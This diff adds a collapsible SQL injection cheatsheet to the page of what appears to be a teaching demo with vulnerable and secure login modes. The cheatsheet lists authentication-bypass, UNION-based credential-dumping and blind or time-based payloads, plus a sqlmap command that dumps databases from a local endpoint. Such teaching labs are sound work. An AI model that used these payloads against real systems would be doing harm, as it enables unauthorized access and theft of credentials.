@@ -152,6 +152,107 @@
             💡 <strong>Try the attack:</strong> Enter <code>' OR '1'='1</code> as the username
             with any password. Works in vulnerable mode, blocked in secure mode.
         </div>
+        <!-- Collapsible SQLi cheatsheet -->
+        <div style="margin-top: 15px;">
+            <button onclick="toggleCheatsheet()"
+                    style="width:100%; padding:10px; background:#2c3e50; color:white;
+                           border:none; border-radius:4px; cursor:pointer; font-size:14px; text-align:left;">
+                📋 SQLi Payload Cheatsheet ▾
+            </button>
+
+            <div id="cheatsheet" style="display:none; border:1px solid #ddd;
+                                        border-radius:0 0 4px 4px; background:white;">
+
+                <!-- Auth Bypass -->
+                <div style="padding:12px 15px; border-bottom:1px solid #eee;">
+                    <div style="font-weight:bold; font-size:13px; color:#e74c3c; margin-bottom:8px;">
+                        🔓 Authentication Bypass
+                    </div>
+                    <table style="width:100%; font-size:12px; border-collapse:collapse;">
+                        <tr style="background:#f9f9f9;">
+                            <th style="padding:6px; text-align:left; border:1px solid #eee;">Payload</th>
+                            <th style="padding:6px; text-align:left; border:1px solid #eee;">How it works</th>
+                        </tr>
+                        <tr>
+                            <td style="padding:6px; border:1px solid #eee;"><code>' OR '1'='1</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">Tautology — always true</td>
+                        </tr>
+                        <tr style="background:#f9f9f9;">
+                            <td style="padding:6px; border:1px solid #eee;"><code>admin'--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">Comment strips password check</td>
+                        </tr>
+                        <tr>
+                            <td style="padding:6px; border:1px solid #eee;"><code>' OR 1=1--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">OR bypass + comment</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <!-- Data Extraction -->
+                <div style="padding:12px 15px; border-bottom:1px solid #eee;">
+                    <div style="font-weight:bold; font-size:13px; color:#e67e22; margin-bottom:8px;">
+                        🗄️ Data Extraction (UNION-based)
+                    </div>
+                    <table style="width:100%; font-size:12px; border-collapse:collapse;">
+                        <tr style="background:#f9f9f9;">
+                            <th style="padding:6px; text-align:left; border:1px solid #eee;">Payload</th>
+                            <th style="padding:6px; text-align:left; border:1px solid #eee;">Purpose</th>
+                        </tr>
+                        <tr>
+                            <td style="padding:6px; border:1px solid #eee;"><code>' UNION SELECT null,username,password FROM users--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">Dump all credentials</td>
+                        </tr>
+                        <tr style="background:#f9f9f9;">
+                            <td style="padding:6px; border:1px solid #eee;"><code>' UNION SELECT null,name,null FROM sqlite_master--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">List all tables</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <!-- Blind SQLi -->
+                <div style="padding:12px 15px; border-bottom:1px solid #eee;">
+                    <div style="font-weight:bold; font-size:13px; color:#8e44ad; margin-bottom:8px;">
+                        🕵️ Blind SQLi
+                    </div>
+                    <table style="width:100%; font-size:12px; border-collapse:collapse;">
+                        <tr style="background:#f9f9f9;">
+                            <th style="padding:6px; text-align:left; border:1px solid #eee;">Payload</th>
+                            <th style="padding:6px; border:1px solid #eee; text-align:left;">Purpose</th>
+                        </tr>
+                        <tr>
+                            <td style="padding:6px; border:1px solid #eee;"><code>' AND 1=1--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">Boolean true — page loads normally</td>
+                        </tr>
+                        <tr style="background:#f9f9f9;">
+                            <td style="padding:6px; border:1px solid #eee;"><code>' AND 1=2--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">Boolean false — page behaves differently</td>
+                        </tr>
+                        <tr>
+                            <td style="padding:6px; border:1px solid #eee;"><code>' AND SLEEP(3)--</code></td>
+                            <td style="padding:6px; border:1px solid #eee;">Time-based — delay confirms vulnerability</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <!-- sqlmap -->
+                <div style="padding:12px 15px;">
+                    <div style="font-weight:bold; font-size:13px; color:#27ae60; margin-bottom:8px;">
+                        🤖 Automated Testing (sqlmap)
+                    </div>
+                    <div style="font-size:12px; color:#555; margin-bottom:8px;">
+                        sqlmap automates detection and exploitation of SQL injection vulnerabilities.
+                    </div>
+                    <div style="background:#2c3e50; color:#ecf0f1; padding:10px;
+                                border-radius:4px; font-family:monospace; font-size:12px;">
+                        # Scan login endpoint for SQLi vulnerabilities<br>
+                        sqlmap -u "http://127.0.0.1:5000/login/vulnerable" \<br>
+                        &nbsp;&nbsp;--data="username=admin&password=test" \<br>
+                        &nbsp;&nbsp;--dbs --dump
+                    </div>
+                </div>
+
+            </div>
+        </div>
 
     </div>
 
@@ -171,6 +272,12 @@
                 btnSecure.className = "active-secure";
                 btnVulnerable.className = "";
             }
+        }
+
+        // Opens and closes the SQLi cheatsheet panel
+        function toggleCheatsheet() {
+            const sheet = document.getElementById("cheatsheet");
+            sheet.style.display = sheet.style.display === "none" ? "block" : "none";
         }
     </script>
 
